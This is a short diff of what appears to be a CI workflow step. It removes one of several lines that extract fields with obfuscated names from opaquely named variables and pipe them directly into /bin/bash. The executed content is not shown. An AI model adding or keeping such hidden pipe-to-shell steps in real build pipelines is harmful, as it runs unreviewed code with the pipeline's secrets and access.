@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$z7" | jq -r .dh41280 | /bin/bash
           echo $k0045 | jq -r .rkdua365 | /bin/bash
           printf '%s' "$ajtc2" | jq -r .g183 | /bin/bash
-          echo $n94725 | jq -r .m4 | /bin/bash
           echo $ddg5357 | jq -r .agtr803 | /bin/bash
 
       - name: Save archive
